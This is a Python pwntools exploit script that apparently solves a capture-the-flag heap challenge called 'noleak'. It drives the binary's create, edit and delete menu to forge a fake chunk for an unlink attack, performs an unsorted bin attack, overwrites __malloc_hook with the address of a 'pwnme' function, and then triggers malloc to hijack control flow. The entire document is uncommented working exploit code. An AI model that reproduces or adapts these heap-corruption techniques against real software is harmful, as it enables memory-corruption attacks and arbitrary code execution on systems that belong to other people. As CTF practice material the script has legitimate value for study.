from pwn import *
context.log_level = 'debug'

p = process('./noleak')

def create(size, content):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap: ')
    p.sendline(content)

def edit(idx,content):
    p.recvuntil('Your choice : ')
    p.sendline('2')
    p.recvuntil('Index : ')
    p.sendline(str(idx))
    p.recvuntil('Size of Heap : ')
    p.sendline('0')
    p.recvuntil('Content of heap : ')
    p.sendline(content)

def delete(idx):
    p.recvuntil('Your choice : ')
    p.sendline('3')
    p.recvuntil('Index : ')
    p.sendline(str(idx))

ptr = 0x6020c0
pwnme_addr = 0x400CCE

create(0x20,'aaa')
create(0x90,'bbb')
create(0x10,'ccc')
create(0x90,'ddd')
create(0x10,'eee')

#unlink
payload = p64(0)+p64(0x20)+p64(ptr-0x18)+p64(ptr-0x10)
payload += p64(0x20)+p64(0xa0)+p64(0)+p64(ptr)
edit(0,payload)
delete(1)

#unsorted bin attack
delete(3)
payload = p64(0)*3+p64(0xa1)+p64(0)+p64(ptr)
edit(2,payload)
create(0x90,'fff')

payload = p64(0)*3+p64(0x6020d0)
edit(0,payload)
edit(0,p8(0x10))#malloc_hook
edit(2,p64(pwnme_addr))

p.recvuntil('Your choice : ')
p.sendline('1')
p.recvuntil('Size of Heap : ')
p.sendline(str(0x10))

p.interactive()
